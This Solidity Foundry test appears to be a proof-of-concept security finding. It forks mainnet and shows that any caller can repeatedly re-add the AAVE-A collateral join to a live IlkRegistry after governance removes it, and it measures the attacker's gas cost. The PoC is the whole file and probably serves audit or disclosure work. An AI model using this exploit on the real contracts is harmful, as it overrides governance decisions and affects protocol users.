// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.16;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface VetoRegistryLike {
    function vat() external view returns (address);
    function join(bytes32 ilk) external view returns (address);
    function add(address adapter) external;
    function removeAuth(bytes32 ilk) external;
}

interface VetoJoinLike {
    function live() external view returns (uint256);
}

interface VetoVatLike {
    function wards(address usr) external view returns (uint256);
}

interface VetoOmegaLike {
    function refresh() external;
    function ilkCount() external view returns (uint256);
    function ilks(uint256 index) external view returns (bytes32);
}

contract IlkRegistryGovernanceRemovalVetoTest is Test {
    uint256 internal constant SNAPSHOT_BLOCK = 25_694_337;
    bytes32 internal constant AAVE_A = "AAVE-A";

    address internal constant REGISTRY = 0x5a464C28D19848f44199D003BeF5ecc87d090F87;
    address internal constant PAUSE_PROXY = 0xBE8E3e3618f7474F8cB1d074A26afFef007E98FB;
    address internal constant AAVE_JOIN = 0x24e459F61cEAa7b1cE70Dbaea938940A7c5aD46e;
    address internal constant OMEGA_POKER = 0xDd538C362dF996727054AC8Fb67ef5394eC9b8b9;

    VetoRegistryLike internal constant registry = VetoRegistryLike(REGISTRY);
    VetoOmegaLike internal constant omega = VetoOmegaLike(OMEGA_POKER);

    function _omegaContains(bytes32 needle) internal view returns (bool) {
        uint256 count = omega.ilkCount();
        for (uint256 i = 0; i < count; i++) {
            if (omega.ilks(i) == needle) return true;
        }
        return false;
    }

    function _refreshAndAssert(bool expected) internal {
        omega.refresh();
        assertEq(_omegaContains(AAVE_A), expected, "unexpected Omega AAVE-A membership");
    }

    function testPublicCallerCanVetoRepeatedGovernanceRemovalCycles() public {
        vm.createSelectFork("mainnet", SNAPSHOT_BLOCK);

        assertEq(registry.join(AAVE_A), address(0), "AAVE-A unexpectedly registered");
        assertEq(VetoJoinLike(AAVE_JOIN).live(), 1, "AAVE Join is not live");
        assertEq(VetoVatLike(registry.vat()).wards(AAVE_JOIN), 1, "AAVE Join is not Vat-authorized");
        _refreshAndAssert(false);

        uint256 attackerAdds;
        uint256 governanceRemovals;
        uint256 totalAttackerGas;

        for (uint256 cycle = 0; cycle < 3; cycle++) {
            uint256 gasBefore = gasleft();
            registry.add(AAVE_JOIN);
            totalAttackerGas += gasBefore - gasleft();
            attackerAdds++;

            assertEq(registry.join(AAVE_A), AAVE_JOIN, "public re-add failed");
            _refreshAndAssert(true);

            vm.prank(PAUSE_PROXY);
            registry.removeAuth(AAVE_A);
            governanceRemovals++;

            assertEq(registry.join(AAVE_A), address(0), "governance removal failed");
            _refreshAndAssert(false);
        }

        uint256 finalGasBefore = gasleft();
        registry.add(AAVE_JOIN);
        totalAttackerGas += finalGasBefore - gasleft();
        attackerAdds++;
        _refreshAndAssert(true);

        console2.log("governance removeAuth cycles", governanceRemovals);
        console2.log("successful unprivileged re-adds", attackerAdds);
        console2.log("final AAVE-A present in Registry", registry.join(AAVE_A) != address(0));
        console2.log("final AAVE-A present in Omega", _omegaContains(AAVE_A));
        console2.log("total attacker add gas", totalAttackerGas);
        console2.log("AAVE Join remains live", VetoJoinLike(AAVE_JOIN).live());
        console2.log("AAVE Join remains Vat ward", VetoVatLike(registry.vat()).wards(AAVE_JOIN));

        assertEq(governanceRemovals, 3, "unexpected governance cycle count");
        assertEq(attackerAdds, 4, "unexpected attacker add count");
        assertEq(registry.join(AAVE_A), AAVE_JOIN, "attacker did not win final state");
        assertTrue(_omegaContains(AAVE_A), "attacker did not restore target-set membership");
    }
}
